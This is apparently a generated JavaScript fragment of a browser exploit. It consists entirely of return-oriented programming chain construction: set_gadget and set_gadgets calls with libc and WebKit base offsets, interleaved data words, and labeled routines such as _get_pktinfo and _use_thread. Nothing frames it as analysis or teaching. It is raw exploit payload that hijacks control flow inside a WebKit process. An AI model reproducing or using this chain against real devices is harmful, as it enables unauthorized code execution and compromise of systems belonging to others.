set_gadget(libc_base+768796,);
//L2970:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+194824,//L2971
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+194808,//L2972
webkit_base+4687784,
libc_base+768796
]);
//L2972:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2971:
db([0,0]);
//L2925:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
getsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+196152,//L2973
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L2973:
db([0,0]);
//_get_pktinfo:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+196224,//L2975
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2975:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+196288,//L2977
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2977:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2978:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L2980:
db([20,0]);// 0x14
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+196432,//L2983
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2981:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L2983:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+196536,//L2986
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2984:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L2986:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+196624,//L2988
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+196640,//L2989
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2988:
db([0,0]);
set_gadget(libc_base+772328,);
//L2989:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+196784,//L2992
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+196752,//L2990
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+196768,//L2991
webkit_base+4687784,
libc_base+165442
]);
//L2990:
db([0,0]);
set_gadget(libc_base+772328,);
//L2991:
db([0,0]);
set_gadget(libc_base+768796,);
//L2992:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2993:
db([46,0]);// 0x2e
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2994:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+196976,//L2997
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2995:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2997:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+197064,//L2999
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+197080,//L3000
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2999:
db([0,0]);
set_gadget(libc_base+772328,);
//L3000:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+197240,//L3002
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+197272,//L3004
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+197224,//L3001
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+197256,//L3003
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3001:
db([0,0]);
set_gadget(libc_base+165442,);
//L3002:
db([0,0]);
set_gadget(libc_base+772328,);
//L3003:
db([0,0]);
set_gadget(libc_base+768796,);
//L3004:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+197368,//L3006
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+197352,//L3005
webkit_base+4687784,
libc_base+165442
]);
//L3005:
db([0,0]);
set_gadget(libc_base+768796,);
//L3006:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3008:
ropchain+197472,//L3007
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+199624,//L3009
//L3007:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+197616,//L3011
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+197632,//L3012
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+197600,//L3010
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3010:
db([0,0]);
set_gadget(libc_base+165442,);
//L3011:
db([0,0]);
set_gadget(libc_base+768796,);
//L3012:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+197760,//L3015
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+197792,//L3017
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+197776,//L3016
webkit_base+4687784,
libc_base+713278
]);
//L3014:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3015:
db([0,0]);
set_gadget(libc_base+165442,);
//L3016:
db([0,0]);
set_gadget(libc_base+768796,);
//L3017:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+197904,//L3018+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+197896,//L3018
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3018:
db([0,0]);
set_gadgets([
ropchain+197920,//L3018+24
ropchain+198384,//L3013
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+197992,//L3021
webkit_base+4687784,
libc_base+768796
]);
//L3019:
db([0,0]);
set_gadget(libc_base+165442,);
//L3020:
db([0,0]);
set_gadget(libc_base+772328,);
//L3021:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+198152,//L3023
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+198184,//L3025
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+198136,//L3022
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+198168,//L3024
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3022:
db([0,0]);
set_gadget(libc_base+165442,);
//L3023:
db([0,0]);
set_gadget(libc_base+772328,);
//L3024:
db([0,0]);
set_gadget(libc_base+768796,);
//L3025:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+198264,//L3026
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+198280,//L3027
webkit_base+4687784,
libc_base+165442
]);
//L3026:
db([0,0]);
set_gadget(libc_base+768796,);
//L3027:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+198376,//L3029
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+198360,//L3028
webkit_base+4687784,
libc_base+165442
]);
//L3028:
db([0,0]);
set_gadget(libc_base+768796,);
//L3029:
db([0,0]);
//L3013:
set_gadgets([
libc_base+713278,
ropchain+198440,//L3032
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3030:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L3032:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+198528,//L3034
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+198544,//L3035
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3034:
db([0,0]);
set_gadget(libc_base+772328,);
//L3035:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+198704,//L3037
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+198736,//L3039
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+198688,//L3036
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+198720,//L3038
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3036:
db([0,0]);
set_gadget(libc_base+165442,);
//L3037:
db([0,0]);
set_gadget(libc_base+772328,);
//L3038:
db([0,0]);
set_gadget(libc_base+768796,);
//L3039:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+198896,//L3043
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+198848,//L3040
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+198864,//L3041
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3040:
db([0,0]);
set_gadget(libc_base+165442,);
//L3041:
db([0,0]);
set_gadget(libc_base+772328,);
//L3042:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L3043:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+199032,//L3045
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+199048,//L3046
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+199016,//L3044
webkit_base+4687784,
libc_base+165442
]);
//L3044:
db([0,0]);
set_gadget(libc_base+772328,);
//L3045:
db([0,0]);
set_gadget(libc_base+768796,);
//L3046:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+199152,//L3047
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+199168,//L3048
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L3047:
db([0,0]);
set_gadget(libc_base+768796,);
//L3048:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+199288,//L3049
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+199272,//L3050
webkit_base+4687784,
libc_base+768796
]);
//L3050:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L3049:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+199376,//L3052
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+199360,//L3051
webkit_base+4687784,
libc_base+165442
]);
//L3051:
db([0,0]);
set_gadget(libc_base+768796,);
//L3052:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+199480,//L3053
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+199496,//L3054
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L3053:
db([0,0]);
set_gadget(libc_base+768796,);
//L3054:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+199616,//L3055
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+199600,//L3056
webkit_base+4687784,
libc_base+768796
]);
//L3056:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L3055:
db([0,0]);
//L3009:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
getsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+200944,//L3057
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L3057:
db([0,0]);
//_use_thread:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+201016,//L3059
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L3059:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+201080,//L3061
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L3061:
db([0,0]);
set_gadget(libc_base+713278,);
db([40,0]);// 0x28
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3062:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3064:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+201232,//L3066
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+201248,//L3067
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3066:
db([0,0]);
set_gadget(libc_base+772328,);
//L3067:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+201368,//L3071
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+201352,//L3070
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3068:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+165442,);
//L3070:
db([0,0]);
set_gadget(libc_base+772328,);
//L3071:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+201456,//L3074
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3072:
db([4294967264,4294967295]);// -0x20
set_gadget(libc_base+772328,);
//L3074:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+201528,//L3077
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3075:
db([4294967256,4294967295]);// -0x28
set_gadget(libc_base+772328,);
//L3077:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+713278,
ropchain+201600,//L3079
webkit_base+4687784,
libc_base+768796
]);
//L3078:
db([12,0]);// 0xc
set_gadget(libc_base+772328,);
//L3079:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3080:
db([8,0]);// 0x8
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+201744,//L3082
webkit_base+4687784,
libc_base+768796
]);
//L3081:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L3082:
db([0,0]);
set_gadget(libc_base+165442,);
//L3083:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+201888,//L3085
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+201904,//L3086
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+201872,//L3084
webkit_base+4687784,
libc_base+165442
]);
//L3084:
db([0,0]);
set_gadget(libc_base+772328,);
//L3085:
db([0,0]);
set_gadget(libc_base+768796,);
//L3086:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+202016,//L3087
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+202032,//L3088
webkit_base+4687784,
libc_base+772328
]);
//L3087:
db([0,0]);
set_gadget(libc_base+768796,);
//L3088:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3089:
db([8,0]);// 0x8
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+202216,//L3091
webkit_base+4687784,
libc_base+768796
]);
//L3090:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L3091:
db([0,0]);
set_gadget(libc_base+165442,);
//L3092:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+202360,//L3094
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+202376,//L3095
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+202344,//L3093
webkit_base+4687784,
libc_base+165442
]);
//L3093:
db([0,0]);
set_gadget(libc_base+772328,);
//L3094:
db([0,0]);
set_gadget(libc_base+768796,);
//L3095:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+202472,//L3097
webkit_base+4687784,
libc_base+713278
]);
//L3096:
db([4294967295,4294967295]);// 0xffffffffffffffff
set_gadget(libc_base+768796,);
//L3097:
db([0,0]);
set_gadgets([
libc_base+856504,//xor rax,rsi ;sub rax,rsi
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+202536,//L3099
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3099:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+202592,//L3101
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3101:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+5236215,//and rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3102:
db([4,0]);// 0x4
set_gadget(libc_base+772328,);
//L3103:
db([4,0]);// 0x4
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+202832,//L3106
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+202800,//L3104
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3104:
db([0,0]);
set_gadget(libc_base+772328,);
//L3105:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L3106:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+202936,//L3108
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+202920,//L3107
webkit_base+4687784,
libc_base+772328
]);
//L3107:
db([0,0]);
set_gadget(libc_base+768796,);
//L3108:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+203032,//L3111
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3109:
db([4294967256,4294967295]);// -0x28
set_gadget(libc_base+772328,);
//L3111:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+203120,//L3113
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+203136,//L3114
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3113:
db([0,0]);
set_gadget(libc_base+772328,);
//L3114:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+203240,//L3117
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+203224,//L3116
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3116:
db([0,0]);
set_gadget(libc_base+772328,);
//L3117:
db([0,0]);
